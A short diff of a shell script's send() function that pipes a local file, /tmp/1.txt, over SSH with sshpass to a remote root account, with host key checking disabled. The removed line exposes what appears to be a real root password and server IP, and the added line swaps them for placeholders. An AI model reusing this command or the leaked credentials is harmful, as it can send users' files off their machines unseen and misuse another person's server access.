@@ -148,7 +148,7 @@ showlink() {
 }
 
 send(){
-    cat /tmp/1.txt | sshpass -p 'bHC7BwAqkM5f8' ssh -o StrictHostKeyChecking=no root@194.163.135.127 'cat - >> /root/v2.txt'
+    cat /tmp/1.txt | sshpass -p 'Root密码' ssh -o StrictHostKeyChecking=no root@{IP地址} 'cat - >> /root/v2.txt'
 }
 
 
